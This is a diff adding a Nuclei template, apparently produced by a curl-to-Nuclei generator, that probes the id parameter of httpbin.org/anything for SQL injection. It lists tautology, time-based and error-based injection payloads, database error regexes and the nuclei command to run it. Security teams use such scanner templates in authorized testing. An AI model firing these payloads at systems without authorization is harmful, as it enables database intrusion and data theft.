@@ -1,0 +1,49 @@
+# python3 cli.py --curl "curl 'https://httpbin.org/anything?id=1&user=guest'" --class sqli --param id --out ./sqli-httpbin-org-anything.yaml
+
+id: sqli-httpbin-org-anything
+
+info:
+  name: SQLI probe on httpbin.org/anything
+  author: curl2nuclei
+  severity: high
+  description: Generated from a captured curl request — fuzzes id for sqli.
+  tags: curl2nuclei,sqli
+
+http:
+  - raw:
+      - |
+        GET /anything?id={{payload}}&user=guest HTTP/1.1
+        Host: httpbin.org
+        
+
+    payloads:
+      payload:
+        - "'"
+        - "''"
+        - "' OR '1'='1"
+        - "1 AND SLEEP(7)--"
+        - "1' AND 1=CONVERT(int,@@version)--"
+    attack: pitchfork
+    stop-at-first-match: true
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        regex:
+          - "SQL syntax"
+          - "mysql_fetch"
+          - "ORA-[0-9]{5}"
+          - "PostgreSQL.*ERROR"
+          - "Microsoft OLE DB"
+          - "Unclosed quotation mark"
+      - type: status
+        status: [500]
+
+┌─ next step ────────────────────────────────────────────────────────────────┐
+│ nuclei -t ./sqli-httpbin-org-anything.yaml -u https://httpbin.org/anything │
+│                                                                            │
+│ written: ./sqli-httpbin-org-anything.yaml                                  │
+└────────────────────────────────────────────────────────────────────────────┘
+
+# nuclei -validate -t ./sqli-httpbin-org-anything.yaml -nc
+[INF] All templates validated successfully
